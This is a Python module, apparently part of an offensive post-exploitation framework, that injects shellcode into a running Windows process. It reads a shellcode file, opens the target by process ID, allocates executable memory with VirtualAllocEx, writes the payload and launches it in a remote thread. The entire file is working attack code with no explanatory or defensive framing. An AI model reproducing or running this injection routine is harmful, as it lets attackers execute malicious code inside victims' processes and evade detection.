import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const

def main(args):
    if args.pid == 0 or args.pid == 4:
        eh.ui.Echo("Cannot inject shellcode to system processes")
        return
    try:
        scbuf = open(args.bin, "rb").read()
    except Exception:
        eh.ui.Echo("Failed to read shellcode", eh.ECHO_ERROR)
        return
    hproc = api.GetProcessHandle(args.pid, const.PROCESS_VM_WRITE | const.PROCESS_CREATE_THREAD | const.PROCESS_VM_OPERATION)
    if not hproc:
        eh.ui.Echo("Failed to open process with pid " + str(args.pid), eh.ECHO_ERROR)
        return
    eh.ui.Echo("Opened process with pid " + str(args.pid), eh.ECHO_DEFAULT)
    mem_ptr = api.VirtualAllocEx(hproc, len(scbuf), const.MEM_COMMIT | const.MEM_RESERVE, const.PAGE_EXECUTE_READWRITE)
    if not mem_ptr:
        eh.ui.Echo("Failed to allocate memory to shellcode", eh.ECHO_ERROR)
        api.CloseFile(hproc)
        return
    eh.ui.Echo("Allocated memory to shellcode " + hex(mem_ptr), eh.ECHO_DEFAULT)

    written = api.WriteMemoryEx(hproc, mem_ptr, scbuf)
    eh.ui.Echo("Copyed " + str(written) + " bytes", eh.ECHO_DEFAULT)

    thread = api.CreateThread(hproc, mem_ptr, 0, 0)

    #clingyspider.VirtualFreeEx(hproc, mem_ptr)
    api.CloseFile(hproc)



